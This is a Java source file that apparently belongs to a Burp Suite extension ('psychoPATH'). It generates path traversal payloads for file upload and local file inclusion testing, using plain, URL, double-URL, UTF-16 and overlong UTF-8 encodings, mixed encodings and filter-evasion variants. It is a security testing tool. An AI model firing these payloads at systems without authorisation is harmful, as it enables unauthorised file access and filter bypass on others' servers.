package uk.co.pentest.psychoPATH;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IIntruderPayloadGenerator;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ListModel;

/*
 * @author ewilded
 */
public final class IntruderPayloadGenerator implements IIntruderPayloadGenerator 
{

    ArrayList<String> psychopaths; // the final payloads
    ArrayList<String> psychopaths_raw; // payloads before output encoding
    //static int pathInstances=0;
    int payloadIndex;    // counter for the payload mark       
    String payloadType;  // path or mark
    byte[] bytes_raw;    // byte payloads    
    ArrayList<String> bytes_out; // 
    IBurpExtenderCallbacks callbacks = BurpExtender.getBurpCallbacks();
    ArrayList<String> directoriesToCheck; // this is for the verification phase
    int payloadMarkerLength=7; // the lenght of the payload marker, a fixed length is safer while injecting into images etc.   
    PsychoTab tab;
    String psychoMode="full-madness"; 
    // other options include: 
    // 'moderate' (should be as moderate as 'moderate rebels' LOL)
    // 'full-madness' - all combinations for the most exhaustive testing
    
    //protected String[] spaces={" ","%20","%25%32%65","%u0020","",""};   
    // plain, URL-encoded, double-URL-encoded, UTF-16, overlong UTF 2-byte, overlong UTF 3-byte // ,overlong UTF 4-byte, overlong UTF 5-byte, overlong UTF 6-byte
    // must have the same number of elements, otherwise the non-mixed encoding basic variant will get confused
    String[] dots={".", "%2e", "%25%32%65","%u002e", "%c0%ae", "%e0%ae"}; // %f0%80%80%ae, %f8%80%80%80%ae, %fc%80%80%80%80%ae
    String[] slashes={"/","%2f","%25%32%66","%u2215","%c0%af", "%e0%af"}; // %f0%80%80%af, %f8%80%80%80%af, %fc%80%80%80%80%af
    String[] backslashes={"\\","%5c","%25%35%63","%u2216","%c1%9c","%e1%9c"}; // %f1%80%80%9c, %f9%80%80%80%9c, %fd%80%80%80%80%9c
    //. = %u002e, / = %u2215, \ = %u2216 
    ArrayList<String> unitTraversalsToUse;
    ArrayList<String> basicTraversals;
                                   
    ArrayList<String> slashesToUse;
    
    protected void addWindows()
    {
        for(int i=0;i<this.backslashes.length;i++)
        {
            slashesToUse.add(backslashes[i]);
        }
        basicTraversals.add("..\\");
    }
    
    protected void addUnix()
    {
        for(int i=0;i<this.slashes.length;i++)
        {
            slashesToUse.add(slashes[i]);
        }
        basicTraversals.add("../");        
    }

    protected ArrayList<String> getSlashes(String payload)
    {
        ArrayList<String> ret =new ArrayList();
        
        int found_counter=0;
        for(int j=0;j<slashesToUse.size();j++)  
        {
            if(payload.contains(slashesToUse.get(j)))
            {
                found_counter++;
                // before adding the payload below to the list we need to make the same thing with the dot
                ret.add(slashesToUse.get(j));
                if(found_counter==2) break; // no point in looking for more than two instances                            
            }                           
        }
        return ret;
    }
    protected ArrayList<String> getDots(String payload)
    {
        ArrayList<String> ret =new ArrayList();        
        int found_counter=0;
        for(int j=0;j<dots.length;j++)  
        {
            if(payload.contains(dots[j]))
            {
                found_counter++;
                // before adding the payload below to the list we need to make the same thing with the dot
                ret.add(dots[j]);
                if(found_counter==2) break; // no point in looking for more than two instances                            
            }                           
        }
        return ret;
    }
    public IntruderPayloadGenerator(String payloadType, PsychoTab tab) 
    {
        this.payloadType = payloadType;
        this.tab=tab;
        
        unitTraversalsToUse = new ArrayList<>();
        slashesToUse = new ArrayList<>();
        basicTraversals = new ArrayList<>();
        
        if("path".equals(this.payloadType)||"mark".equals(this.payloadType)) // "path" and "marker" generators
        {
            Set<String> targetDocroots; // this is a merge of the prefixes and targets
            ArrayList<String> brutDocrootSuffixes; // we'll also merge all targets into this
            ArrayList<String> traversals;
      
            
            if(this.tab.psychoPanel.slashesToUse=="win")
            {
                addWindows();
            }
            if(this.tab.psychoPanel.slashesToUse=="nix")
            {
                addUnix();
            }
            if(this.tab.psychoPanel.slashesToUse=="all")
            {
                addWindows();
                addUnix();
            }
            
            for(int i=0;i<this.basicTraversals.size();i++)
            {
                unitTraversalsToUse.add(basicTraversals.get(i));                
            }
            
            // fix the init             [DONE]
            
            // now, add basic (non-mixed) support for different encodings ;]]   [DONE]            
            
            for(int i=0;i<basicTraversals.size();i++)
            {                
                for(int j=1;j<dots.length;j++) // skip the first element as it is equal to what we're replacing
                {
                    String payload = basicTraversals.get(i);
                    // variants could be created here, but first let's get rid of those duplicates
                    payload=payload.replace(".",dots[j]);
                    payload=payload.replace("/",slashes[j]);
                    payload=payload.replace("\\",backslashes[j]);
                    unitTraversalsToUse.add(payload);
                    this.tab.psychoPanel.stdout.println("Adding "+payload);
                }
            }            
            this.tab.psychoPanel.stdout.println("[DEBUG] The overall number of universal traversals to use without encoding-mixing: "+unitTraversalsToUse.size());
            
            // NOW, the jacuzzi-made algorithm for mixed encoding payloads:
            // 1. basically, a traversal consists of at least two dots and at least one slash
            // 2. all anti-recurrent evasive techniques stem from this principle anyway and this is how their payloads will be derived once we have dealt with 
            //    generating of the mixed-encoding variants
            // 3. there is no point in mixing more than two encodings in one payload
            // 4. there is most likely an optimum appproach (choosing the most probable set of mixed-encoding characters in a base traversal, e.g. .%2e/ or even .%2e/%2f 
            //    whereas %2e and %2f simply represent holders for chars presented in a different encoding than the default (which is no encoding, literal char) - the 'basic' mode
            // 5. while the full psychoPATHic combinatorics will boil down to:
            //    5.1 iterate over all encodings, nested (one iteration inside of the another)
            //    5.2 skip if the current encoding in the parent loop is the same as the one in the current loop
            //    5.3 iterate over all base traversal units
            //    5.4 assume the parent-loop encoding as the default (for all the chars)
            //    5.5 iterate over every single character of the unit traversal and create a variant of it, replacing the current char with its version (encoded with the inner-loop encoding)
            //    5.6 the 'medium' optimisation mode will only be picking one of the middle characters
            //    5.7 the 'full-madness' mode will generate all variants

            // mixed-encoding fixed examples
            /*
                this.basicTraversals.add(".%2e/");
                this.basicTraversals.add(".%2e%2f");
                this.basicTraversals.add(".%2e%2f");
                this.basicTraversals.add("..%2f/.");
        
                // UTF-8
                this.basicTraversals.add("%c0%2e%c0%af%c0%af"); 
                // UTF-16
                this.basicTraversals.add("%u002e%u2215%u2215");
                // 2-byte overlong UTF-8
                this.basicTraversals.add("%c0%ae%c0%af%c0%af");            
            */            
            
            ArrayList<String> mixedTraversalsToUse=new ArrayList();
            
            // OK, this is the 'moderate' mode, can be easily tuned up to provide the 'basic' set as well
            for(int i=0;i<basicTraversals.size();i++)
            {
                for(int j=0;j<dots.length;j++) // dots.length must be equal to slashes.length and basckslashes.length and simply represents the number of supported encodings
                {
                    for(int k=0;k<dots.length;k++) // the child loop
                    {
                        if(j==k) continue; // it's not 'mixing' if encodings are equal
                        for(int l=0;l<basicTraversals.get(i).length();l++) // iterate over characters
                        {
                            // everything is replaced with j, the currently iterated char is replaced with k      
                            String newTraversal="";
                            for(int m=0;m<basicTraversals.get(i).length();m++)
                            {                                
                                if(l==m)
                                {
                                    // use the second (child loop) encoding for this one
                                    if(basicTraversals.get(i).charAt(m)=='.')
                                    {
                                        newTraversal+=dots[k]; // add something
                                    }
                                    if(basicTraversals.get(i).charAt(m)=='/')
                                    {
                                        newTraversal+=slashes[k]; // add something
                                    }
                                    if(basicTraversals.get(i).charAt(m)=='\\')
                                    {
                                        newTraversal+=backslashes[k]; // add something
                                    }                                    
                                } 
                                else
                                {
                                    // use the 'default' (parent loop) encoding
                                    //this.tab.psychoPanel.stdout.println("unitTraversalsToUse.get("+i+").charAt("+m+")="+basicTraversals.get(i).charAt(m));
                                    if(basicTraversals.get(i).charAt(m)=='.')
                                    {                                        
                                        newTraversal+=dots[j]; 
                                    }
                                    if(basicTraversals.get(i).charAt(m)=='/')
                                    {
                                        newTraversal+=slashes[j];
                                    }
                                    if(basicTraversals.get(i).charAt(m)=='\\')
                                    {
                                        newTraversal+=backslashes[j];
                                    }                                    
                                }
                            }
                            mixedTraversalsToUse.add(newTraversal);
                            unitTraversalsToUse.add(newTraversal); // OK let's do this!
                            this.tab.psychoPanel.stdout.println("Adding "+newTraversal);
                            // add the traversal to the collection
                            // fuck this will be massive
                        }
                    }
                }
            }
            
            this.tab.psychoPanel.stdout.println("[DEBUG] The overall number of mixed-encoding traversals to use (in "+psychoMode+" mode): "+mixedTraversalsToUse.size());
            
            this.tab.psychoPanel.stdout.println("[DEBUG] The overall number of all traversals to use: "+(mixedTraversalsToUse.size()+unitTraversalsToUse.size()));
            
            // OK, not so bad
            
            // what's left:
            // revise the mixed-encoding evasive variants to avoid generating payloads for scenarios that do not make sense
            // scanner integration
            // termination character
            // consider backslashes in evasive techniques (they do not seem to be supported at the moment at all)
            // cover docroot mode as well            
            // find new vulns ;]
            
            // nice to haves:
            // add breakup-string encoding into non-recurrent evasive techniques
            // encoding-management
            // full-madness mode
            // reflect the changes in the UI
            // reflect the changes in the documentation
            // send this to the store
                               
        
            // Evasive techniques - is there a point in full encoding mixing in the evasive payloads?
            // IMO not, as the very process of mixing encodings has evasive purpose, so for example if our evasive payload looks like
            // "....//" there is no point in creating all variants like ".%2e..//" or ..%2e.//, so it's just a waste of resources.
            // With these traversal variants, however, it makes sense to perform:
            // 1) full (non-mixed) encoding variants, e.g. %2e%2e%2e%2e%2f%2f
            // 2) partially mixed encoding variants (e.g. at least these two: "..%2f/", "%2e%2e/%2f", maybe also "%2e%2e%2e%2e//" and "....%2f%2f").
            
            // load the evasive traversals
            // by the way, this code is supposed to adjust the evasive traversals according to the set of slashes to use 
            // (whether or not we are using backlashes, although we should even as an evasive technique itself)... this has to be fixed
            
            if(this.tab.psychoPanel.evasiveTechniques)
            {
                this.tab.psychoPanel.stdout.println("Evasive techniques enabled...");
                // read and decode the list of currently loaded breakup strings, if there are any
                ListModel breakupModel = this.tab.psychoPanel.breakupList.getModel();
                ArrayList<String> breakupStrings = new ArrayList<>();
                for(int i=0;i<breakupModel.getSize();i++)
                {
                    String asciihex=breakupModel.getElementAt(i).toString();
                    // ok, now we need to convert it back to characters and store in the breakupTraversals array
                    StringBuilder output = new StringBuilder();
                    for (int j = 0; j < asciihex.length(); j+=2) 
                    {
                        String str = asciihex.substring(j,j+2);
                        output.append((char)Integer.parseInt(str,16));
                    }
                    breakupStrings.add(output.toString());
                }
                
                ListModel evasiveTravModel = this.tab.psychoPanel.evasiveList.getModel();
                ArrayList<String> evasiveTraversalsToUse=new ArrayList();
                for (int i=0; i<evasiveTravModel.getSize(); i++) 
                {
                    String evasiveTraversal=evasiveTravModel.getElementAt(i).toString();
                    if(evasiveTraversal.contains("{BREAK}")) // we are dealing with a break-up sequence
                    {
                        // iterate over break-up strings and create variations
                        for(int j=0;j<breakupStrings.size();j++)
                        {
                            evasiveTraversalsToUse.add(evasiveTraversal.replace("{BREAK}", breakupStrings.get(j))); 
                        }
                        // otherwise the traversal is ignored (not added to the unitTraversalsToUse arr list)
                    }
                    else
                    {
                        evasiveTraversalsToUse.add(evasiveTraversal);
                    }
                }  
                // now, the encodings
                           
                for(int i=0;i<evasiveTraversalsToUse.size();i++)
                {
                    // OK, let's produce the variants:
                    // 1. non-mixed (literal)
                    unitTraversalsToUse.add(evasiveTraversalsToUse.get(i));
                    
                    // plus:                
                    for(int j=1;j<dots.length;j++) // dots.length must be equal to slashes.length and basckslashes.length and simply represents the number of supported encodings
                    {
                        // we skip j=0
                        // 2.  only dot or only slash mixed
                        unitTraversalsToUse.add(evasiveTraversalsToUse.get(i).replace(".",dots[j]));
                        if(evasiveTraversalsToUse.get(i).contains("/"))
                        {
                            unitTraversalsToUse.add(evasiveTraversalsToUse.get(i).replace("/",slashes[j]));
                        }
                        if(evasiveTraversalsToUse.get(i).contains("\\"))
                        {
                            unitTraversalsToUse.add(evasiveTraversalsToUse.get(i).replace("\\",backslashes[j]));
                        }                                                
                    }
                }
                // 3. only specific dot-slash sequences mixed  "..%2f/", "%2e%2e/%2f"
                // these are the only mixed senacrious that appear to make any sense, there was no point in implementing them in the loop above
                for(int j=1;j<dots.length;j++) // dots.length must be equal to slashes.length and basckslashes.length and simply represents the number of supported encodings
                {
                    for(int i=0;i<slashesToUse.size();i++)
                    {
                       if(slashesToUse.get(i)=="/")
                       {
                           unitTraversalsToUse.add(".."+slashes[j]+"/");             //  "..%2f/", "..%25%32%66/" and the like
                           unitTraversalsToUse.add(dots[j]+dots[j]+"/"+slashes[j]);  //  "%2e%2e/%2f", "%25%32%65%25%32%65/%25%32%66 and the like
                           unitTraversalsToUse.add("."+dots[j]+"/"+slashes[j]);      //  
                       }
                       if(slashesToUse.get(i)=="\\")
                       {
                           unitTraversalsToUse.add(".."+backslashes[j]+"\\");               //  "..%5c/", "..%25%35%63\" and the like
                           unitTraversalsToUse.add(dots[j]+dots[j]+"\\"+backslashes[j]);    //  "%2e%2e\%5c", %25%32%65%25%32%65\%25%35%63 and the like
                           unitTraversalsToUse.add("."+dots[j]+"\\"+backslashes[j]);        //   
                       }
                    }
                }
                // 
            }
            else
            {
                this.tab.psychoPanel.stdout.println("Evasive techniques NOT enabled...");
            }
            String fileName;
            PsychoPanel panel=this.tab.getUiComponent();                        
            this.psychopaths = new ArrayList<>();
            this.psychopaths_raw = new ArrayList<>();           
            // generate all the payloads and put them into the arr
            targetDocroots = new HashSet<>();
            brutDocrootSuffixes = new ArrayList<>();
            traversals = new ArrayList<>(); 
            // 0) populate traversals and the filename           
            ArrayList<String> longestTraversals = new ArrayList<>();
            for(int i=0;i<unitTraversalsToUse.size();i++)
            {
                String baseTraversal = unitTraversalsToUse.get(i);
                String traversal=baseTraversal;
                for(int j=0;j<this.tab.psychoPanel.maxTraversalsPerPayload;j++)
                {
                    traversals.add(traversal);
                    if(j==this.tab.psychoPanel.maxTraversalsPerPayload-1) longestTraversals.add(traversal);
                    traversal=traversal+baseTraversal;
                }
            }
            this.tab.psychoPanel.stdout.println("The number of longest traversals to use is "+longestTraversals.size());       
            fileName=panel.fileNameField.getText();
      
            // 1) copy @brute_doc_root_prefixes to @target_docroots
            if(panel.LFImode==false) // whether to use the webroots at all
            {
                this.tab.psychoPanel.stdout.println("LFI mode is NOT enabled...");
                ListModel docListModel = panel.docrootsList.getModel();
            //if(docListModel==null) this.panel.stdout.println("The thing is empty...");
            
                for (int i=0; i<docListModel.getSize(); i++) 
                {
                    String targetDocroot=docListModel.getElementAt(i).toString();
                    // if the targetDocroot contains the {TARGET} holder
               
                    if(targetDocroot.contains("{TARGET}"))
                    {
                        // iterate over the targets 
                        // and create corresponding versions of the targetDocroot by substitution
                        ListModel targetListModel = panel.targetsList.getModel();
                   
                        for(int j=0;j<targetListModel.getSize();j++)
                        {
                             String target=targetListModel.getElementAt(j).toString();
                             String newTargetDocroot=targetDocroot.replace("{TARGET}",target);
                             targetDocroots.add(newTargetDocroot);
                        } 
                                        
                    }
                     // otherwise simply copy the targetDocroot                
                     else
                    {
                     targetDocroots.add(targetDocroot);     
                    }                
                }             
                // add the empty suffix
                brutDocrootSuffixes.add("");
                // 2.1) copy @targets to @brut_doc_suffixes
                ListModel targetListModel = panel.targetsList.getModel();
                for(int i=0;i<targetListModel.getSize();i++)
                {
                   String target=targetListModel.getElementAt(i).toString();
                   brutDocrootSuffixes.add(target);
                }                 
                // 2.2) copy @suffixes to @brut_doc_suffixes
                ListModel suffixListModel = panel.suffixesList.getModel();
                for(int i=0;i<suffixListModel.getSize();i++)
                {
                    String suffix=suffixListModel.getElementAt(i).toString();
                    brutDocrootSuffixes.add(suffix);
                }
                // 3.1) iterate through @targetDocroots -> 
                //        3.2)   iterate through @brute_doc_root_suffixes -> 
            //                3.3)      iterate through traversals -> 
            //                     3.4)              generate psychopaths
            }
            else
            {
                this.tab.psychoPanel.stdout.println("LFI mode is enabled...");
            }
            // 3.4.1 the bare filename with no prepended path injections
            this.psychopaths_raw.add(fileName);             
            // 3.4.2 the pure traversal + filename permutations (for upload directories hidden within the document root and LFI mode)
            if(panel.LFImode==true&&panel.optimizeLFI==true)
            {
                for(int i=0;i<longestTraversals.size();i++)        // 3.3
                {
                    // if filename contains a slash in the first place, it should be the same slash that is used in the traversal sequence (maybe create files to use array as well?)
                    // same with the dot
                    // this will get more convoluted once we deal with payloads with mixed encoding (dots are multiple by default, slashes can as well in some evasive techniques)
                    // this is where the duplicates come from...
                    // the point is not to attempt to replace if something's not there
                    // but the very slashesToUse thing was only made to support windows...
                    // on the other hand we have the file names
                    
                    // OK, the algorithm is as follows:
                    // 1. check if the filename has slash/dot in it (might be defined by the user, might as well contain a webroot once we merge this with upload mode)
                    // 2.1 if not, simply append and move on
                    // 2.2 if yes, estimate what slash/slashes/dot/dots are present in the traversal - will either be one or two
                    //     and then create one up to two variants with appended filename, accordingly
                    //     using windows slashes will not matter, as they will only appear in one payload with nix ones for the evasive purpose
                    //     so regardless to the encoding chosen, there won't be more than two alternative slashes/dots in the same payload (because it does not make any sense)
                    
                    // should be easier to do it with functions, like:
                    // if contains / then get traversal's slash/slashes
                    // if contains . then get traversal's dot/dots
                    // get variants based on slashes and dots
                    ArrayList<String> payloadVariants = new ArrayList();
                    ArrayList<String> travSlashes=new ArrayList();
                    ArrayList<String> travDots= new ArrayList();
                    
                    if(fileName.contains("/")) travSlashes=getSlashes(longestTraversals.get(i));
                    if(fileName.contains(".")) travDots=getDots(longestTraversals.get(i));
                    
                    // depending on the contents of the file name and the values returned by the getSlashes() & getDots() we might be adding at least 1
                    // but not more than 4 alternative payloads to psychopaths_raw.
                    
                    if(travSlashes.size()==0&&travDots.size()==0)
                    {
                        this.psychopaths_raw.add(longestTraversals.get(i)+fileName); // both are 0, we simply go with one version of the payload
                    }                    
                    else
                    {   // OK, this should avoid duplicates now:
                        // if there were no dots/slashes found in the filename in the first place, no variants of it to align with the traversal will be produced
                        for(int j=0;j<travSlashes.size();j++)
                        {
                           this.psychopaths_raw.add(longestTraversals.get(i)+fileName.replace("/",travSlashes.get(j))); 
                        }
                        for(int j=0;j<travDots.size();j++)
                        {
                           this.psychopaths_raw.add(longestTraversals.get(i)+fileName.replace(".",travDots.get(j))); 
                        }
                    }                          
                }
            }
            else // OK, this is file upload mode that needs to be adjusted the algorithm above
            {
                for(int i=0;i<traversals.size();i++)
                {
                    String payload=traversals.get(i)+fileName;
                    for(int j=0;j<slashesToUse.size();j++)
                    {
                        this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(j))); 
                    }
                }
            }

            // 3.4.3 the targetDocroot+brutDocrootsuffix permutations 
            
            
            for(String targetDocRoot : targetDocroots) // 3.1
            {
                for(int i=0;i<brutDocrootSuffixes.size();i++) // 3.2
                {     
                    if(this.tab.psychoPanel.optimizeDocroots)
                    {
                        for(int j=0;j<longestTraversals.size();j++)        // 3.3
                        {
                          // if the docroot is windows-specific, we skip the letter for the traversal for it to work
                          String payload=longestTraversals.get(j)+targetDocRoot.replace("C:","")+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                          for(int k=0;k<slashesToUse.size();k++)
                          {
                                this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(k)));   
                          }
                        }
                    }
                    else
                    {
                        for(int j=0;j<traversals.size();j++)        // 3.3
                        {
                          String payload=traversals.get(j)+targetDocRoot.replace("C:","")+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                          for(int k=0;k<slashesToUse.size();k++)
                          {
                                this.psychopaths_raw.add(payload.replace("/",slashesToUse.get(k)));
                          }
                        }
                    }
                    if(this.tab.psychoPanel.useAbsoluteWebroots)
                    {
                         ListModel drivesModel = panel.drivesList.getModel();                                                                          
                         String payload=targetDocRoot+"/"+brutDocrootSuffixes.get(i)+"/"+fileName;
                         for(int j=0;j<slashesToUse.size();j++)
                         {
                                String docroot=payload.replace("/",slashesToUse.get(j));
                                if(docroot.startsWith("C:"))
                                {
                                    for(int k=0;k<drivesModel.getSize();k++)
                                    {
                                         // if we are dealing with windows, we nee to make sure we use all drive the letters configured                                    
                                         this.psychopaths_raw.add(docroot.replace("C:",drivesModel.getElementAt(k).toString()+":"));                                 
                                    }  
                                }
                                else
                                {
                                    this.psychopaths_raw.add(docroot);
                                }
                         }                       
                    }
                }
            }  

            
            // now we have to deal with the output encodings
            ListModel encodeModel = this.tab.psychoPanel.encodeList.getModel();
            for(int j=0;j<this.psychopaths_raw.size();j++)
            {
                for(int i=0;i<encodeModel.getSize();i++)
                {
                   if("None".equals(encodeModel.getElementAt(i).toString()))
                   {
                       this.psychopaths.add(this.psychopaths_raw.get(j));
                   }
                   // this is going away anyway
                   /*
                   if("URL".equals(encodeModel.getElementAt(i).toString())) // URL encode
                   {
                       try {                    
                           this.psychopaths.add(URLEncoder.encode(this.psychopaths_raw.get(j),StandardCharsets.UTF_8.toString()));
                       } catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                   }
                   if("Double URL".equals(encodeModel.getElementAt(i).toString()))
                   {
                        try {                       
                           this.psychopaths.add(URLEncoder.encode(URLEncoder.encode(this.psychopaths_raw.get(j),StandardCharsets.UTF_8.toString())));
                       } catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                   }
                   */
                }
            }
        }
        if("check".equals(payloadType)&&this.directoriesToCheck==null)
        {
            this.directoriesToCheck=new ArrayList<>();
            this.directoriesToCheck=tab.psychoPanel.genericSuffixes; // we simply steal this list :)
        }
    }
    @Override
    public boolean hasMorePayloads() 
    {
        if("check".equals(this.payloadType))
        {
            return this.payloadIndex<this.directoriesToCheck.size();
        }
        if("mark".equals(this.payloadType)||"path".equals(this.payloadType))
        {
            return this.payloadIndex < this.psychopaths.size();
        }
        return false; //unreachable statement
    }

    @Override
    public byte[] getNextPayload(byte[] baseValue) 
    {                
        byte[] payload  = new byte[0];
        if("mark".equals(this.payloadType))
        {
            // return the payload mark corresponding to the path payload, which is simply a unique string (number -> index)
            String prefix="";
            int ln = this.payloadMarkerLength-Integer.toString(this.payloadIndex).length();
            for(int i=0;i<ln;i++) prefix=prefix+"0";
            payload=callbacks.getHelpers().stringToBytes(prefix+Integer.toString(this.payloadIndex));
        }
        if("path".equals(this.payloadType))
        {
            // return the path payload
            payload = callbacks.getHelpers().stringToBytes(this.psychopaths.get(this.payloadIndex).toString());           
        }
        if("check".equals(this.payloadType))
        {
            payload = callbacks.getHelpers().stringToBytes(this.directoriesToCheck.get(this.payloadIndex).toString()); 
        }        
        this.payloadIndex++; // increase the index
        return payload;
    }
    @Override
    public void reset() 
    {        
        payloadIndex = 0;
    }       
}